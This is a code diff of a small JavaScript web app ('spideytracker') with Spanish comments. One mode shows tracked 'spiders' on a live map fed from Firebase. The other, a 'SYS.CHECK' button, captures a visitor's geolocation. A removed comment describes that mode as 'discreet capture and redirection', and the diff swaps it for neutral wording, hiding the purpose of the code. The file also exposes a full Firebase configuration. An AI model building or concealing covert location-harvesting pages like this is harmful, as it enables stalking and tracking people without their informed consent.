@@ -1,4 +1,4 @@
-// --- CONFIGURACIÓN DE FIREBASE (Versión Global CDN) ---
+// --- CONFIGURACIÓN DE FIREBASE ---
 const firebaseConfig = {
   apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
   authDomain: "spideytracker-591bb.firebaseapp.com",
@@ -9,7 +9,6 @@ const firebaseConfig = {
   measurementId: "G-RFC57L9T0Y"
 };
 
-// Inicializar Firebase con los objetos globales del CDN
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
@@ -19,7 +18,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const mapContainer = document.getElementById("map");
 
     if (mapContainer) {
-        // --- MODO CONSOLA (Visualización de Arañas 🕷️) ---
+        // --- MODO CONSOLA (Mapa y Arañas 🕷️) ---
         const map = L.map('map').setView([0, 0], 2);
         
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -33,7 +32,6 @@ document.addEventListener("DOMContentLoaded", () => {
             iconAnchor: [15, 15]
         });
 
-        // Escuchar cambios en tiempo real con la sintaxis global de Firestore
         db.collection("locations").onSnapshot((snapshot) => {
             snapshot.docChanges().forEach((change) => {
                 if (change.type === "added") {
@@ -52,7 +50,7 @@ document.addEventListener("DOMContentLoaded", () => {
         });
 
     } else if (sysCheckBtn) {
-        // --- MODO OBJETIVO (Captura discreta y redirección) ---
+        // --- MODO OBJETIVO (SYS.CHECK) ---
         sysCheckBtn.addEventListener("click", () => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
